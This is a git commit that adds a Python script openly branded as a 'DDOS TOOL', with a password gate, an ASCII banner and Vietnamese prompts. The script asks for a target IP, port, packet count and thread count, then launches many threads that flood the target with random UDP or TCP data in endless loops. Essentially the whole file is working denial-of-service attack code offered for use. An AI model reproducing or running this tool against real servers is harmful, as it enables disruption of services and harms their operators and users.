a93236048cf7e1e3bc54937c0c2e83f22d4d7063
lykhacdiepp <137049081+lykhacdiepp@users.noreply.github.com>
2023-08-04 12:08:52 +0700

    Add files via upload

---
+++ diepvip.py
@@ -0,0 +1,150 @@
+﻿import random
+import socket
+import threading
+import time
+import os,sys
+import random, socket, threading
+
+pasw = "diepcodesamp"
+
+for i in range(3):
+    pwd = input(" Mặt khảu : ")
+    j = 3
+    if (pwd == pasw):
+        time.sleep(2)
+        print("[0] Loading...")
+        time.sleep(1)
+        print("[10] Loading...")
+        print("[20] Loading...")
+        time.sleep(1)
+        print("[30] Loading...")
+        time.sleep(1)
+        print("[40] Loading...")
+        time.sleep(1)
+        print("[50] Loading...")
+        time.sleep(1)
+        print("[60] Loading...")
+        time.sleep(1)
+        print("[70] Loading...")
+        time.sleep(1)
+        print("[80] Loading...")
+        time.sleep(1)
+        print("[90] Loading...")
+        time.sleep(1)
+        print("[100] Processing\n")
+        time.sleep(2)
+        break
+    else:
+        time.sleep(2)
+        print("[x] sai rồi bạn tình ơi \n")
+        continue
+time.sleep(2)
+print("\033[35m yêu cậu:>")
+time.sleep(2)
+
+os.system("clear")
+print("""
+\u001b[35m
+
+
+██████╗░██████╗░░█████╗░░██████╗
+██╔══██╗██╔══██╗██╔══██╗██╔════╝
+██║░░██║██║░░██║██║░░██║╚█████╗░
+██║░░██║██║░░██║██║░░██║░╚═══██╗
+██████╔╝██████╔╝╚█████╔╝██████╔╝
+╚═════╝░╚═════╝░░╚════╝░╚═════╝░
+
+████████╗░█████╗░░█████╗░██╗░░░░░
+╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
+░░░██║░░░██║░░██║██║░░██║██║░░░░░
+░░░██║░░░██║░░██║██║░░██║██║░░░░░
+░░░██║░░░╚█████╔╝╚█████╔╝███████╗
+░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
+
+AUTHOR TOOLS : ly khac diep 
+Tool Version: diepsampvipv1.0
+
+Ly khac diep """)
+print("\033[32m━━━ đăng ký chưa?? (y/n)")
+choice = str(input("┗━>\033[0m:"))
+time.sleep(1)
+print("\033[31m━━━ Host/IP")
+ip = str(input("┗━>\033[0m:"))
+time.sleep(1)
+print("\033[31m━━━ Port")
+port = int(input("┗━>\033[0m:"))
+time.sleep(1)
+print("\033[32m━━━ Pakets")	
+print("\033[32m━━━ Min Pakets 100")
+times = int(input("┗━>\033[0m:"))
+time.sleep(1)
+print("\033[31m━━━ Threads")
+print("\033[31m━━━ Min Threads 110")
+threads = int(input("┗━>\033[0m:"))
+def xxxx():
+  data = random._urandom(998)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+        print(i +" \033[32m=====> [khac diep] Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      print("[!] Server Attack")
+
+def xxx():
+  data = random._urandom(998)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+        print(i +" \033[32m=====>[khac diep] Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      print("[!] Server Attack")
+
+def xx():
+  data = random._urandom(871)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      s.close()
+      print("[!] Server Attack")
+
+def x():
+  data = random._urandom(871)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      s.close()
+      print("[!] Server Attack")
+
+for y in range(threads):
+  if choice == 'y':
+    th = threading.Thread(target = xxxx)
+    th.start()
+    th = threading.Thread(target = xxx)
+    th.start()
+  else:
+    th = threading.Thread(target = xx)
+    th.start()
+    th = threading.Thread(target = x)
+    th.start()
